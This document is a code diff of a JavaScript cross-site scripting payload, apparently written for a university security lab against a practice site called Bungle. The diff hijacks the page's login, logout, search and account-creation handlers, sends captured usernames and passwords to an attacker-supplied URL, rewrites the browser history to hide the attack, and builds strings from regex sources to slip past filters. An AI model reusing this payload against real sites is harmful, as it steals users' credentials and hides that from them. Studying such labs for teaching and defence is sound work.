@@ -9,7 +9,9 @@ function payload(attacker) {
 
 	var x = String(/.\/ /);
 	console.log(x);
-	x = x.substring(1,x.length-4) + x.substring(3,x.length-2);
+	x1 = x.substring(1,x.length-4); 
+	x2=  x.substring(3,x.length-2);
+	x =  x1+x2
 	console.log(x);
 	var y = /\//.source.substring(1);
 	console.log(y);
@@ -17,19 +19,28 @@ function payload(attacker) {
 	console.log(link);
 	function proxy(href) {
 		$("html").load(href, function(){
+			$(/a/.source).filter(/:contains(<script>)/.source).remove();
 			$("html").show();
+			window.onpopstate = function(event) 
+			{
+            proxy(document.location.href.split(/.edu/.source)[1]) ; 
+       		 }	
 			//log(attacker,{event:"nav", uri:href});
 			// $("#query").val("pwned!")
 			// is someone logged in
 			if ($(/#logged-in-user/.source).text())
 			{
 				// time to log 
-				$.get(attacker,{event:"nav", user:$(/#logged-in-user/.source).val(),uri: href});
+				$.get(attacker,{event:"nav", user:$(/#logged-in-user/.source).text(),uri: href});
 				//historyF();
 				// chagning the URL to hide our attack
-				history.pushState(null,null,'http://trurl.cs.illinois.edu/');
+				if (!history.state)
+				{
+					history.replaceState(null,null,href);
+				}
+				
 				//testing 
-				$("#query").val("pwned!")
+				$("#query").val("pwned!");
 			}
 			// no user 
 			else 
@@ -38,65 +49,84 @@ function payload(attacker) {
 				$.get(attacker,{event:"nav", uri:href});
 				//historyF();
 				//changing the URL to hide our attack
-				history.pushState(null,null,'http://trurl.cs.illinois.edu/');
-				$("#query").val("pwned2!")
+				//history.pushState(null,null,'http://trurl.cs.illinois.edu/');
+				if (!history.state)
+				{
+					history.replaceState(null,null,href);
+				}
+				$("#query").val("pwned2!");
 			}
 
-			$("#search-btn").click(function(event)
+			$(/#search-btn/.source).click(function(event)
 			{
 				//historyF();
 				// do not take default action
 				event.preventDefault();
-				q = $("#query").val();
-				history.pushState(null,null,'http://trurl.cs.illinois.edu/search?q=/'+q);
-				proxy('http://trurl.cs.illinois.edu/search?q=/'+q);
+				// get input query
+				q = $(/#query/.source).val();
+				//change URL to make it look like real search
+				history.pushState(href,null, /search?q=/.source + q);
+				proxy(/search?q=/.source + q);
 
 			});
 
-			$("#search-again-btn").click(function(event)
+			$(/#search-again-btn/.source).click(function(event)
 			{
 				//historyF();
-				history.pushState(null,null,'http://trurl.cs.illinois.edu/');
+				//bring u back home
+				history.pushState(null,null,href);
 				event.preventDefault();
-				proxy(href)
+				proxy(x)
 			});
 
 
-			$("#bungle-lnk").click(function(event) 
+			$(/#bungle-lnk/.source).click(function(event) 
 			{
 				//historyF();
-				history.pushState(null,null,'http://trurl.cs.illinois.edu/');
+				history.pushState(null,null,href);
 				event.preventDefault();
-				proxy(href);
+				proxy(x)
 			});
+/*
 
-			$("#log-out-btn").click(function(event)
+	HAVING TROUBLE WITH THIS FUNCTION; CANT SEEM TO LOG OUT ONCE LOGGED IN
+
+*/
+			$(/#log-out-btn/.source).click(function(event)
 			{
-				$.get(attacker,{event: "logout", user:$("#username").val()});
-				$.post(link + $("#logout"), function(){
+				// DO NOT ALLOW default
+				event.preventDefault();
+				// log logging out
+				$.get(attacker,{event: /logout/.source, user:$(/#username/.source).val()});
+				// go back to original state
+				$.post(link + /logout/.source,function(){
 					history.pushState(null,null,x);
 					proxy(x);
 				});
 			});
-		   $("#log-in-btn").click(function(event)
+		   $(/#log-in-btn/.source).click(function(event)
 		   {
-		   	event.preventDefault();
-		   	$.post(link + $("login"), 
-		   		{username: $("#username").val(),
-		   		 password: $("#userpass").val()},
+		   	// do not allow default
+		    	event.preventDefault();
+
+		   		$.post(link + /login/.source, 
+		   		{username: $(/#username/).val(),
+		   		 password: $(/#userpass/).val()},
 		   		 function() {
-		   		 	$.get(attacker,{event: "login", user: $("#username").val(),pass: $("#userpass").val()});
+		   		 	$.get(attacker,{event: /login/.source, user: $(/#username/).val(),pass: $(/#userpass/).val()});
 		   		 	proxy(x);
+		   		
+
 		   		 });
 		   });
 
-		   $("#new-account-btn").click(function(event)
+		   $(/#new-account-btn/.source).click(function(event)
 		   {
 		   	event.preventDefault();
-		   	$.post(link + /create/, {username: $("#username").val(),
-		    password: $("#userpass").val()},
+		   	$.post(link + /create/.source, {username: $(/#username/).val(),
+		    password: $(/#userpass/).val()},
 		    function(){
-		    	$.get(attacker,{event: "/create/", user: $("#username").val(), pass: $("#userpass").val()});
+		    	$.get(attacker,{event: /create/.source, user: $(/#username/).val(), pass: $(/#userpass/).val()});
 		    	proxy(x);
 		    });
 		   });
